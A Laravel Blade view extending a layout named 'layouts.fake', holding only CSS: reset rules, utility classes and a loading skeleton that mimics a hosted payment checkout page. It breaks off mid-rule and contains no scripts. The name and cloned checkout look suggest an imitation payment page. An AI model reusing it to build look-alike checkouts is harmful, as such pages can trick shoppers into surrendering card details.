@extends('layouts.fake')

@push('css')
    <style>
        html {
            line-height: 1.15;
            -webkit-text-size-adjust: 100%;
        }

        h1 {
            font-size: 2em;
            margin: 0.67em 0;
        }

        hr {
            box-sizing: content-box;
            height: 0;
            overflow: visible;
        }

        pre {
            font-family: monospace, monospace;
            font-size: 1em;
        }

        a {
            background-color: transparent;
        }

        abbr[title] {
            border-bottom: none;
            text-decoration: underline;
            text-decoration: underline dotted;
        }

        b,
        strong {
            font-weight: bolder;
        }

        code,
        kbd,
        samp {
            font-family: monospace, monospace;
            font-size: 1em;
        }

        small {
            font-size: 80%;
        }

        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline;
        }

        sub {
            bottom: -0.25em;
        }

        sup {
            top: -0.5em;
        }

        img {
            border-style: none;
        }

        button,
        input,
        optgroup,
        select,
        textarea {
            font-family: inherit;
            font-size: 100%;
            line-height: 1.15;
            margin: 0;
        }

        button,
        input {
            overflow: visible;
        }

        button,
        select {
            text-transform: none;
        }

        [type="button"],
        [type="reset"],
        [type="submit"],
        button {
            -webkit-appearance: button;
        }

        [type="button"]::-moz-focus-inner,
        [type="reset"]::-moz-focus-inner,
        [type="submit"]::-moz-focus-inner,
        button::-moz-focus-inner {
            border-style: none;
            padding: 0;
        }

        [type="button"]:-moz-focusring,
        [type="reset"]:-moz-focusring,
        [type="submit"]:-moz-focusring,
        button:-moz-focusring {
            outline: 1px dotted ButtonText;
        }

        fieldset {
            padding: 0.35em 0.75em 0.625em;
        }

        legend {
            box-sizing: border-box;
            color: inherit;
            display: table;
            max-width: 100%;
            padding: 0;
            white-space: normal;
        }

        progress {
            vertical-align: baseline;
        }

        textarea {
            overflow: auto;
        }

        [type="checkbox"],
        [type="radio"] {
            box-sizing: border-box;
            padding: 0;
        }

        [type="number"]::-webkit-inner-spin-button,
        [type="number"]::-webkit-outer-spin-button {
            height: auto;
        }

        [type="search"] {
            -webkit-appearance: textfield;
            outline-offset: -2px;
        }

        [type="search"]::-webkit-search-decoration {
            -webkit-appearance: none;
        }

        ::-webkit-file-upload-button {
            -webkit-appearance: button;
            font: inherit;
        }

        details {
            display: block;
        }

        summary {
            display: list-item;
        }

        [hidden],
        template {
            display: none;
        }

        .p0 {
            padding: 0;
        }

        .p1 {
            padding: 4px;
        }

        .py1 {
            padding-top: 4px;
            padding-bottom: 4px;
        }

        .px1 {
            padding-left: 4px;
            padding-right: 4px;
        }

        .p2 {
            padding: 8px;
        }

        .py2 {
            padding-top: 8px;
            padding-bottom: 8px;
        }

        .px2 {
            padding-left: 8px;
            padding-right: 8px;
        }

        .p3 {
            padding: 12px;
        }

        .py3 {
            padding-top: 12px;
            padding-bottom: 12px;
        }

        .px3 {
            padding-left: 12px;
            padding-right: 12px;
        }

        .p4 {
            padding: 16px;
        }

        .py4 {
            padding-top: 16px;
            padding-bottom: 16px;
        }

        .px4 {
            padding-left: 16px;
            padding-right: 16px;
        }

        .p5 {
            padding: 24px;
        }

        .py5 {
            padding-top: 24px;
            padding-bottom: 24px;
        }

        .px5 {
            padding-left: 24px;
            padding-right: 24px;
        }

        .p6 {
            padding: 32px;
        }

        .py6 {
            padding-top: 32px;
            padding-bottom: 32px;
        }

        .px6 {
            padding-left: 32px;
            padding-right: 32px;
        }

        .m0 {
            margin: 0;
        }

        .mt0 {
            margin-top: 0;
        }

        .mr0 {
            margin-right: 0;
        }

        .mb0 {
            margin-bottom: 0;
        }

        .ml0,
        .mx0 {
            margin-left: 0;
        }

        .mx0 {
            margin-right: 0;
        }

        .my0 {
            margin-top: 0;
            margin-bottom: 0;
        }

        .m1 {
            margin: 4px;
        }

        .mt1 {
            margin-top: 4px;
        }

        .mr1 {
            margin-right: 4px;
        }

        .mb1 {
            margin-bottom: 4px;
        }

        .ml1,
        .mx1 {
            margin-left: 4px;
        }

        .mx1 {
            margin-right: 4px;
        }

        .my1 {
            margin-top: 4px;
            margin-bottom: 4px;
        }

        .m2 {
            margin: 8px;
        }

        .mt2 {
            margin-top: 8px;
        }

        .mr2 {
            margin-right: 8px;
        }

        .mb2 {
            margin-bottom: 8px;
        }

        .ml2,
        .mx2 {
            margin-left: 8px;
        }

        .mx2 {
            margin-right: 8px;
        }

        .my2 {
            margin-top: 8px;
            margin-bottom: 8px;
        }

        .m3 {
            margin: 12px;
        }

        .mt3 {
            margin-top: 12px;
        }

        .mr3 {
            margin-right: 12px;
        }

        .mb3 {
            margin-bottom: 12px;
        }

        .ml3,
        .mx3 {
            margin-left: 12px;
        }

        .mx3 {
            margin-right: 12px;
        }

        .my3 {
            margin-top: 12px;
            margin-bottom: 12px;
        }

        .m4 {
            margin: 16px;
        }

        .mt4 {
            margin-top: 16px;
        }

        .mr4 {
            margin-right: 16px;
        }

        .mb4 {
            margin-bottom: 16px;
        }

        .ml4,
        .mx4 {
            margin-left: 16px;
        }

        .mx4 {
            margin-right: 16px;
        }

        .my4 {
            margin-top: 16px;
            margin-bottom: 16px;
        }

        .m5 {
            margin: 24px;
        }

        .mt5 {
            margin-top: 24px;
        }

        .mr5 {
            margin-right: 24px;
        }

        .mb5 {
            margin-bottom: 24px;
        }

        .ml5,
        .mx5 {
            margin-left: 24px;
        }

        .mx5 {
            margin-right: 24px;
        }

        .my5 {
            margin-top: 24px;
            margin-bottom: 24px;
        }

        .m6 {
            margin: 32px;
        }

        .mt6 {
            margin-top: 32px;
        }

        .mr6 {
            margin-right: 32px;
        }

        .mb6 {
            margin-bottom: 32px;
        }

        .ml6,
        .mx6 {
            margin-left: 32px;
        }

        .mx6 {
            margin-right: 32px;
        }

        .my6 {
            margin-top: 32px;
            margin-bottom: 32px;
        }

        .mxn1 {
            margin-left: -4px;
            margin-right: -4px;
        }

        .mxn2 {
            margin-left: -8px;
            margin-right: -8px;
        }

        .mxn3 {
            margin-left: -12px;
            margin-right: -12px;
        }

        .mxn4 {
            margin-left: -16px;
            margin-right: -16px;
        }

        .mxn5 {
            margin-left: -24px;
            margin-right: -24px;
        }

        .mxn6 {
            margin-left: -32px;
            margin-right: -32px;
        }

        .ml-auto {
            margin-left: auto;
        }

        .mr-auto,
        .mx-auto {
            margin-right: auto;
        }

        .mx-auto {
            margin-left: auto;
        }

        .mb-2px {
            margin-bottom: 2px;
        }

        @-webkit-keyframes placeload {
            0% {
                -webkit-transform: translateX(-100%);
                transform: translateX(-100%);
            }
            to {
                -webkit-transform: translateX(100%);
                transform: translateX(100%);
            }
        }

        @keyframes placeload {
            0% {
                -webkit-transform: translateX(-100%);
                transform: translateX(-100%);
            }
            to {
                -webkit-transform: translateX(100%);
                transform: translateX(100%);
            }
        }

        @-webkit-keyframes exit {
            0% {
                opacity: 1;
            }
            to {
                opacity: 0;
            }
        }

        @keyframes exit {
            0% {
                opacity: 1;
            }
            to {
                opacity: 0;
            }
        }

        @-webkit-keyframes enter {
            0% {
                -webkit-transform: scale(0.97);
                transform: scale(0.97);
                opacity: 0.1;
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1);
                opacity: 1;
            }
        }

        @keyframes enter {
            0% {
                -webkit-transform: scale(0.97);
                transform: scale(0.97);
                opacity: 0.1;
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1);
                opacity: 1;
            }
        }

        @-webkit-keyframes enter-form-mobile {
            0% {
                opacity: 0.1;
                -webkit-transform: translateY(1rem);
                transform: translateY(1rem);
            }
            to {
                opacity: 1;
                -webkit-transform: none;
                transform: none;
            }
        }

        @keyframes enter-form-mobile {
            0% {
                opacity: 0.1;
                -webkit-transform: translateY(1rem);
                transform: translateY(1rem);
            }
            to {
                opacity: 1;
                -webkit-transform: none;
                transform: none;
            }
        }

        @-webkit-keyframes enter-form-desktop {
            0% {
                opacity: 0.1;
                -webkit-transform: translateX(1.5rem);
                transform: translateX(1.5rem);
            }
            to {
                opacity: 1;
                -webkit-transform: none;
                transform: none;
            }
        }

        @keyframes enter-form-desktop {
            0% {
                opacity: 0.1;
                -webkit-transform: translateX(1.5rem);
                transform: translateX(1.5rem);
            }
            to {
                opacity: 1;
                -webkit-transform: none;
                transform: none;
            }
        }

        @-webkit-keyframes enter-background-shadow {
            0% {
                -webkit-transform: scaleX(0.9);
                transform: scaleX(0.9);
                opacity: 0.1;
            }
            to {
                -webkit-transform: scaleX(1);
                transform: scaleX(1);
                opacity: 1;
            }
        }

        @keyframes enter-background-shadow {
            0% {
                -webkit-transform: scaleX(0.9);
                transform: scaleX(0.9);
                opacity: 0.1;
            }
            to {
                -webkit-transform: scaleX(1);
                transform: scaleX(1);
                opacity: 1;
            }
        }

        .LOADING-loads {
            border-radius: 7px;
            background-color: rgba(0, 0, 0, 0.05);
            overflow: hidden;
            position: relative;
        }

        .LOADING-loads:after {
            position: absolute;
            content: "";
            top: 0;
            left: 0;
            height: 100%;
            width: 200%;
            -webkit-animation: placeload 1.3s linear infinite forwards;
            animation: placeload 1.3s linear infinite forwards;
            background: linear-gradient(90deg, hsla(0, 0%, 100%, 0), hsla(0, 0%, 100%, 0.65) 50%, hsla(0, 0%, 100%, 0));
            -webkit-transform: translateX(-100%);
            -ms-transform: translateX(-100%);
            transform: translateX(-100%);
        }

        .LOADING-container {
            -webkit-animation: enter 0.3s 0s;
            animation: enter 0.3s 0s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both;
            pointer-events: none;
            position: absolute;
            padding: 0 16px;
            top: 0;
            left: 0;
            right: 0;
            z-index: 9999999;
        }

        .LOADING-hidden {
            -webkit-animation: exit 0.3s;
            animation: exit 0.3s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both;
        }

        .LOADING-checkoutContainer {
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            padding: 16px 0;
            width: 100%;
            max-width: 380px;
            box-sizing: border-box;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            margin: 0 auto;
        }

        .LOADING-header {
            min-height: 32px;
        }

        .LOADING-backArrow,
        .LOADING-header {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .LOADING-backArrow {
            width: 14px;
            height: 32px;
            margin-right: 8px;
            color: rgba(0, 0, 0, 0.2);
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
        }

        .LOADING-logo {
            width: 28px;
            height: 28px;
            border-radius: 100%;
        }

        .LOADING-productSummary {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            margin-top: 32px;
            margin-bottom: 10px;
        }

        .LOADING-productTitle {
            width: 85px;
            height: 16px;
            -webkit-box-ordinal-group: 3;
            -webkit-order: 2;
            -ms-flex-order: 2;
            order: 2;
            border-radius: 20px;
            margin: 2px 0;
        }

        .LOADING-productPrice {
            width: 123px;
            height: 24px;
            margin: 8px 0 32px;
            -webkit-box-ordinal-group: 4;
            -webkit-order: 3;
            -ms-flex-order: 3;
            order: 3;
            border-radius: 20px;
        }

        .LOADING-productImageContainer {
            margin: 0 auto 20px;
        }

        .LOADING-productImage,
        .LOADING-productImageContainer {
            -webkit-box-ordinal-group: 2;
            -webkit-order: 1;
            -ms-flex-order: 1;
            order: 1;
        }

        .LOADING-productImage {
            width: 120px;
            height: 120px;
        }

        .LOADING-paymentTitle {
            display: none;
        }

        .LOADING-payment-oneRow,
        .LOADING-payment-twoRow {
            width: 100%;
        }

        .LOADING-button {
            width: 100%;
            height: 44px;
            margin-top: 29px;
        }

        .LOADING-payment-oneRow {
            height: 46px;
        }

        .LOADING-payment-twoRow {
            height: 90px;
        }

        .LOADING-mb38 {
            margin-bottom: 38px;
        }

        .LOADING-checkoutPayment {
            margin-top: 48px;
            -webkit-animation: enter-form-mobile 0.3s 0.1s;
            animation: enter-form-mobile 0.3s 0.1s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both;
            opacity: 0.1;
            -webkit-transform: translateY(2rem);
            -ms-transform: translateY(2rem);
            transform: translateY(2rem);
        }

        .LOADING-container--single .LOADING-checkoutPayment {
            margin-top: 0;
        }

        .LOADING-container--single .LOADING-productSummary {
            display: none;
        }

        .LOADING-container--single .LOADING-checkoutOverview {
            padding-bottom: 0;
            margin-bottom: 66px;
        }

        .LOADING-footer {
            color: rgba(26, 26, 26, 0.5);
            font-size: 12px;
            width: 100%;
            text-align: center;
            position: absolute;
            bottom: -3em;
            left: 0;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Ubuntu, sans-serif;
        }

        .LOADING-footer svg {
            position: relative;
            top: 4px;
            fill: rgba(26, 26, 26, 0.4);
        }

        .LOADING-container--single .LOADING-footer {
            bottom: -2rem;
        }

        .LOADING-container.LOADING-container--redirectPage .LOADING-checkoutContainer,
        .LOADING-container:not(.LOADING-container--redirectPage) .LOADING-redirectContainer {
            display: none;
        }

        .LOADING-redirectContainer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            height: 100vh;
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
        }

        .LOADING-redirectContainer .LOADING-redirectSpinner {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-box-pack: center;
            width: 60px;
            height: 60px;
            -webkit-box-ordinal-group: 2;
            -webkit-order: 1;
            -ms-flex-order: 1;
            order: 1;
        }

        .LOADING-redirectContainer .LOADING-redirectSpinner,
        .LOADING-redirectContainer .LOADING-redirectTitle {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            border-radius: 20px;
        }

        .LOADING-redirectContainer .LOADING-redirectTitle {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-box-pack: center;
            width: 130px;
            height: 40px;
            margin-top: 12px;
            -webkit-box-ordinal-group: 3;
            -webkit-order: 2;
            -ms-flex-order: 2;
            order: 2;
        }

        .LOADING-redirectContainer .LOADING-redirectMessage {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            width: 300px;
            height: 60px;
            margin-top: 12px;
            -webkit-box-ordinal-group: 4;
            -webkit-order: 3;
            -ms-flex-order: 3;
            order: 3;
            border-radius: 20px;
        }

        @media only screen and (min-width: 992px) {
            .LOADING-payment-oneRow {
                height: 38px;
            }

            .LOADING-payment-twoRow {
                height: 74px;
            }

            .LOADING-header {
                min-height: 28px;
                left: -21px;
                position: relative;
            }

            .LOADING-backArrow {
                height: 28px;
                margin-left: 0;
            }

            .LOADING-container {
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
                -webkit-box-pack: center;
                -webkit-justify-content: center;
                -ms-flex-pack: center;
                justify-content: center;
                min-height: 0;
                -webkit-box-align: center;
                -webkit-align-items: center;
                -ms-flex-align: center;
                align-items: center;
                padding: 0;
            }

            .LOADING-checkoutContainer {
                -webkit-transform: translateY(max(48px, calc(50vh - 55%)));
                -ms-transform: translateY(max(48px, calc(50vh - 55%)));
                transform: translateY(max(48px, calc(50vh - 55%)));
            }

            .LOADING-double .LOADING-checkoutContainer {
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -webkit-flex-direction: row;
                -ms-flex-direction: row;
                flex-direction: row;
                padding: 16px 0 0;
                max-width: 920px;
            }

            .LOADING-container--single .LOADING-checkoutContainer {
                -webkit-box-align: center;
                -webkit-align-items: center;
                -ms-flex-align: center;
                align-items: center;
            }

            .LOADING-container:not(.LOADING-container--single) .LOADING-checkoutPayment {
                margin-top: 0;
                -webkit-animation: enter-form-desktop 0.3s 0.1s forwards;
                animation: enter-form-desktop 0.3s 0.1s forwards;
                opacity: 0.1;
                -webkit-transform: translateX(2rem);
                -ms-transform: translateX(2rem);
                transform: translateX(2rem);
            }

            .LOADING-checkoutOverview,
            .LOADING-checkoutPayment {
                width: 380px;
                margin-bottom: 0;
                padding-bottom: 40px;
            }

            .LOADING-container:not(.LOADING-container--single):before {
                height: 100vh;
                width: 50%;
                background: #fff;
                position: fixed;
                content: " ";
                top: 0;
                right: 0;
                -webkit-animation: enter-background-shadow 0.3s;
                animation: enter-background-shadow 0.3s;
                -webkit-animation-fill-mode: both;
                animation-fill-mode: both;
                -webkit-transform-origin: right;
                -ms-transform-origin: right;
                transform-origin: right;
                -webkit-transform: scaleX(0.9);
                -ms-transform: scaleX(0.9);
                transform: scaleX(0.9);
                opacity: 0.1;
                box-shadow: 15px 0 30px 0 rgba(0, 0, 0, 0.18);
            }

            .LOADING-container.LOADING-container--redirectPage:before {
                display: none;
            }

            .LOADING-productSummary {
                -webkit-box-align: start;
                -webkit-align-items: flex-start;
                -ms-flex-align: start;
                align-items: flex-start;
                margin-bottom: 0;
            }

            .LOADING-productTitle {
                -webkit-box-ordinal-group: 2;
                -webkit-order: 1;
                -ms-flex-order: 1;
                order: 1;
            }

            .LOADING-productPrice {
                -webkit-box-ordinal-group: 3;
                -webkit-order: 2;
                -ms-flex-order: 2;
                order: 2;
                margin: 13px 0 32px;
            }

            .LOADING-container--multiItem .LOADING-productImageContainer {
                display: none;
            }

            .LOADING-productImageContainer {
                width: 300px;
                height: 300px;
                margin: 32px 0;
            }

            .LOADING-productImage,
            .LOADING-productImageContainer {
                -webkit-box-ordinal-group: 4;
                -webkit-order: 3;
                -ms-flex-order: 3;
                order: 3;
            }

            .LOADING-productImage {
                width: 187px;
                height: 187px;
            }

            .LOADING-footer {
                position: absolute;
                bottom: 0;
                left: 0;
                text-align: left;
                margin: 12px 0;
            }

            .LOADING-paymentTitle {
                display: block;
                width: 160px;
                height: 26px;
                margin-bottom: 40px;
                border-radius: 20px;
            }

            .LOADING-container--single .LOADING-paymentTitle {
                display: none;
            }

            .LOADING-container--single .LOADING-footer {
                text-align: center;
            }

            .LOADING-container--multiItem .LOADING-lineItem {
                -webkit-box-ordinal-group: 4;
                -webkit-order: 3;
                -ms-flex-order: 3;
                order: 3;
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
                margin-bottom: 24px;
            }

            .LOADING-container--multiItem .LOADING-productImage {
                display: none;
            }

            .LOADING-container--multiItem .LOADING-lineItem-image {
                width: 42px;
                height: 42px;
                display: inline-block;
            }

            .LOADING-container--multiItem .LOADING-lineItem-lines {
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -webkit-flex-direction: column;
                -ms-flex-direction: column;
                flex-direction: column;
                -webkit-box-pack: justify;
                -webkit-justify-content: space-between;
                -ms-flex-pack: justify;
                justify-content: space-between;
                margin-left: 12px;
            }

            .LOADING-container--multiItem .LOADING-lineItem-line {
                width: 280px;
                height: 12px;
            }
        }

        * {
            box-sizing: border-box;
        }

        @supports (scroll-behavior: smooth) {
            html {
                scroll-behavior: smooth;
            }
        }

        html {
            line-height: 1.3;
        }

        body {
            margin: 0;
            padding: 0;
            font-size: 16px;
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Ubuntu, sans-serif;
            color: rgba(26, 26, 26, 0.9);
            -webkit-font-smoothing: antialiased;
            -ms-touch-action: manipulation;
            touch-action: manipulation;
        }

        body.is-darkMode {
            background-color: #000;
        }

        body:lang(ja) {
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Ubuntu, Hiragino Sans, Yu Gothic UI, Meiryo UI, Hiragino Kaku Gothic ProN, sans-serif;
        }

        body:lang(zh) {
            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Ubuntu, PingFang SC, Hiragino Sans GB, Heiti SC, Microsoft YaHei, Microsoft JhengHei, sans-serif;
        }

        input:-webkit-autofill {
            transition: background-color 100000000s;
            -webkit-animation: native-autofill-in 1ms;
        }

        input {
            -webkit-animation: native-autofill-out 1ms;
        }

        .u-screenReaderOnly {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border: 0;
        }

        @-webkit-keyframes native-autofill-in {
            0% {
                opacity: 1;
            }
            to {
                opacity: 1;
            }
        }

        @-webkit-keyframes native-autofill-out {
            0% {
                opacity: 1;
            }
            to {
                opacity: 1;
            }
        }
    </style>
    <style>
        .Link {
            text-decoration: none;
            cursor: pointer;
        }

        .Link:focus {
            outline: 1px dotted rgba(26, 26, 26, 0.5);
        }

        .Link--primary {
            color: #0074d4;
        }

        .Link--secondary {
            color: rgba(26, 26, 26, 0.5);
            text-decoration: underline;
        }

        .flex-container {
            box-sizing: border-box;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-wrap: nowrap;
            -ms-flex-wrap: nowrap;
            flex-wrap: nowrap;
        }

        .flex-item {
            box-sizing: border-box;
            -webkit-box-flex: 0;
            -webkit-flex: 0 1 auto;
            -ms-flex: 0 1 auto;
            flex: 0 1 auto;
            min-width: 0;
            max-width: 100%;
        }

        .flex-item-align-left {
            margin-right: auto;
            text-align: left;
        }

        .flex-item-align-right {
            margin-left: auto;
            text-align: right;
        }

        .flex-item:empty {
            display: none;
        }

        .flex-column-break {
            -webkit-flex-basis: 100%;
            -ms-flex-preferred-size: 100%;
            flex-basis: 100%;
            width: 0;
        }

        .direction-row {
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
        }

        .direction-row-reverse {
            -webkit-box-orient: horizontal;
            -webkit-box-direction: reverse;
            -webkit-flex-direction: row-reverse;
            -ms-flex-direction: row-reverse;
            flex-direction: row-reverse;
        }

        .direction-column {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
        }

        .direction-column-reverse {
            -webkit-box-orient: vertical;
            -webkit-box-direction: reverse;
            -webkit-flex-direction: column-reverse;
            -ms-flex-direction: column-reverse;
            flex-direction: column-reverse;
        }

        .spacing-0 {
            margin: 0;
        }

        .spacing-0 > .flex-item {
            padding: 0;
        }

        .spacing-4 {
            margin: -2px;
        }

        .spacing-4 > .flex-item {
            padding: 2px;
        }

        .spacing-8 {
            margin: -4px;
        }

        .spacing-8 > .flex-item {
            padding: 4px;
        }

        .spacing-12 {
            margin: -6px;
        }

        .spacing-12 > .flex-item {
            padding: 6px;
        }

        .spacing-16 {
            margin: -8px;
        }

        .spacing-16 > .flex-item {
            padding: 8px;
        }

        .spacing-24 {
            margin: -12px;
        }

        .spacing-24 > .flex-item {
            padding: 12px;
        }

        .spacing-32 {
            margin: -16px;
        }

        .spacing-32 > .flex-item {
            padding: 16px;
        }

        .flex-item-no-padding {
            padding-top: 0 !important;
            padding-bottom: 0 !important;
        }

        .justify-content-flex-start {
            -webkit-box-pack: start;
            -webkit-justify-content: flex-start;
            -ms-flex-pack: start;
            justify-content: flex-start;
        }

        .justify-content-flex-end {
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end;
        }

        .justify-content-center {
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
        }

        .justify-content-space-between {
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
        }

        .justify-content-space-around {
            -webkit-justify-content: space-around;
            -ms-flex-pack: distribute;
            justify-content: space-around;
        }

        .justify-content-space-evenly {
            -webkit-box-pack: space-evenly;
            -webkit-justify-content: space-evenly;
            -ms-flex-pack: space-evenly;
            justify-content: space-evenly;
        }

        .align-items-flex-start {
            -webkit-box-align: start;
            -webkit-align-items: flex-start;
            -ms-flex-align: start;
            align-items: flex-start;
        }

        .align-items-flex-end {
            -webkit-box-align: end;
            -webkit-align-items: flex-end;
            -ms-flex-align: end;
            align-items: flex-end;
        }

        .align-items-center {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .align-items-stretch {
            -webkit-box-align: stretch;
            -webkit-align-items: stretch;
            -ms-flex-align: stretch;
            align-items: stretch;
        }

        .align-items-baseline {
            -webkit-box-align: baseline;
            -webkit-align-items: baseline;
            -ms-flex-align: baseline;
            align-items: baseline;
        }

        .wrap-wrap {
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
        }

        .wrap-nowrap {
            -webkit-flex-wrap: nowrap;
            -ms-flex-wrap: nowrap;
            flex-wrap: nowrap;
        }

        .width-auto {
            width: auto;
        }

        .width-auto,
        .width-fixed {
            -webkit-flex-basis: auto;
            -ms-flex-preferred-size: auto;
            flex-basis: auto;
        }

        .width-fixed {
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
        }

        .width-grow {
            -webkit-flex-basis: 0;
            -ms-flex-preferred-size: 0;
            flex-basis: 0;
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
        }

        .width-1 {
            width: 8.33333333%;
        }

        .width-2 {
            width: 16.66666667%;
        }

        .width-3 {
            width: 25%;
        }

        .width-4 {
            width: 33.33333333%;
        }

        .width-5 {
            width: 41.66666667%;
        }

        .width-6 {
            width: 50%;
        }

        .width-7 {
            width: 58.33333333%;
        }

        .width-8 {
            width: 66.66666667%;
        }

        .width-9 {
            width: 75%;
        }

        .width-10 {
            width: 83.33333333%;
        }

        .width-11 {
            width: 91.66666667%;
        }

        .width-12 {
            width: 100%;
        }

        @media only screen and (min-width: 576px) {
            .direction-row-sm {
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -webkit-flex-direction: row;
                -ms-flex-direction: row;
                flex-direction: row;
            }

            .direction-row-reverse-sm {
                -webkit-box-orient: horizontal;
                -webkit-box-direction: reverse;
                -webkit-flex-direction: row-reverse;
                -ms-flex-direction: row-reverse;
                flex-direction: row-reverse;
            }

            .direction-column-sm {
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -webkit-flex-direction: column;
                -ms-flex-direction: column;
                flex-direction: column;
            }

            .direction-column-reverse-sm {
                -webkit-box-orient: vertical;
                -webkit-box-direction: reverse;
                -webkit-flex-direction: column-reverse;
                -ms-flex-direction: column-reverse;
                flex-direction: column-reverse;
            }

            .spacing-0-sm {
                margin: 0;
            }

            .spacing-0-sm > .flex-item {
                padding: 0;
            }

            .spacing-4-sm {
                margin: -2px;
            }

            .spacing-4-sm > .flex-item {
                padding: 2px;
            }

            .spacing-8-sm {
                margin: -4px;
            }

            .spacing-8-sm > .flex-item {
                padding: 4px;
            }

            .spacing-12-sm {
                margin: -6px;
            }

            .spacing-12-sm > .flex-item {
                padding: 6px;
            }

            .spacing-16-sm {
                margin: -8px;
            }

            .spacing-16-sm > .flex-item {
                padding: 8px;
            }

            .spacing-24-sm {
                margin: -12px;
            }

            .spacing-24-sm > .flex-item {
                padding: 12px;
            }

            .spacing-32-sm {
                margin: -16px;
            }

            .spacing-32-sm > .flex-item {
                padding: 16px;
            }

            .justify-content-flex-start-sm {
                -webkit-box-pack: start;
                -webkit-justify-content: flex-start;
                -ms-flex-pack: start;
                justify-content: flex-start;
            }

            .justify-content-flex-end-sm {
                -webkit-box-pack: end;
                -webkit-justify-content: flex-end;
                -ms-flex-pack: end;
                justify-content: flex-end;
            }

            .justify-content-center-sm {
                -webkit-box-pack: center;
                -webkit-justify-content: center;
                -ms-flex-pack: center;
                justify-content: center;
            }

            .justify-content-space-between-sm {
                -webkit-box-pack: justify;
                -webkit-justify-content: space-between;
                -ms-flex-pack: justify;
                justify-content: space-between;
            }

            .justify-content-space-around-sm {
                -webkit-justify-content: space-around;
                -ms-flex-pack: distribute;
                justify-content: space-around;
            }

            .justify-content-space-evenly-sm {
                -webkit-box-pack: space-evenly;
                -webkit-justify-content: space-evenly;
                -ms-flex-pack: space-evenly;
                justify-content: space-evenly;
            }

            .align-items-flex-start-sm {
                -webkit-box-align: start;
                -webkit-align-items: flex-start;
                -ms-flex-align: start;
                align-items: flex-start;
            }

            .align-items-flex-end-sm {
                -webkit-box-align: end;
                -webkit-align-items: flex-end;
                -ms-flex-align: end;
                align-items: flex-end;
            }

            .align-items-center-sm {
                -webkit-box-align: center;
                -webkit-align-items: center;
                -ms-flex-align: center;
                align-items: center;
            }

            .align-items-stretch-sm {
                -webkit-box-align: stretch;
                -webkit-align-items: stretch;
                -ms-flex-align: stretch;
                align-items: stretch;
